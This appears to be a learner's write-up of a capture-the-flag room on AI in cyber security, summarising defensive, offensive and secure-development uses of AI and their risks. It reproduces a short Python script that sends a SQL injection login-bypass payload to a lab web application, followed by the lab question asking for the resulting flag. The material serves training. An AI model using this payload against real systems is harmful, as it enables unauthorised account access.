# AI in Security - old sAInt nick
Unleash the power of AI by exploring it's uses within cyber security.

**Learning Objectives**

- How AI can be used as an assistant in cyber security for a variety of roles, domains and tasks
- Using an AI assistant to solve various tasks within cyber security
-Some of the considerations, particularly in cyber security, surrounding the use of AI

---

**Artificial Intelligence (AI)** has become a major force in cybersecurity, widely adopted for its ability to automate tasks, analyse large datasets, and enhance both defensive and offensive operations. 
Organisations increasingly expect professionals to understand and effectively use AI tools as they become integrated into daily workflows.

---

## In defensive security

AI agents support blue teams by rapidly processing logs, identifying anomalies, adding context to alerts, and even automating responses such as isolating compromised devices or blocking suspicious activity in real time. 
Vendors now embed AI into appliances like firewalls and intrusion detection systems.

---

## In offensive security

AI assists pentesters by automating tedious tasks such as reconnaissance, OSINT, and analysing scanner output, freeing them to focus on complex, human-driven exploitation activities.

## In software development

AI helps developers brainstorm, review code, and detect vulnerabilities through SAST/DAST scanning. 
However, while AI is good at identifying security issues, it is not always reliable at generating secure code.

---

Despite its benefits, deploying AI in cybersecurity requires caution. 

Risks include: 

- unreliable output
- the potential to cause system disruption during offensive testing
- data privacy concerns
- opaque decision-making
- the need to verify AI-generated insights.

---

## Practical

The practical exercise introduces **“Van SolveIT,”** an AI assistant that guides users through three cybersecurity showcases: 

- generating exploit scripts (red team)
- analysing attack logs (blue team)
- reviewing code for vulnerabilities (software security).
  
Tips are provided to ensure smooth interaction and navigation during the exercise.

<img width="1365" height="558" alt="image" src="https://github.com/user-attachments/assets/e790061c-f311-458a-b347-34f6b0560517" />


<img width="1358" height="562" alt="image" src="https://github.com/user-attachments/assets/a9b5206e-5451-45a7-be40-16a738d117bb" />

```code
import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = "http://MACHINE_IP:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)


```


<img width="1360" height="547" alt="image" src="https://github.com/user-attachments/assets/57e5723d-1f99-45f5-beb6-db48d92fa8d0" />


<img width="1364" height="564" alt="image" src="https://github.com/user-attachments/assets/fb92e87d-2f72-42be-8b23-f3e2b4fc938e" />


<img width="739" height="597" alt="image" src="https://github.com/user-attachments/assets/32663818-e783-49e7-bf2b-90a9c477b02b" />

<img width="735" height="594" alt="image" src="https://github.com/user-attachments/assets/62db0e44-276c-416c-b483-4346e1c77be7" />


Execute the exploit provided by the red team agent against the vulnerable web application hosted at 10.67.179.105:5000. What flag is provided in the script's output after it?

Remember, you will need to update the IP address placeholder in the script with the IP of your vulnerable machine (10.67.179.105:5000)







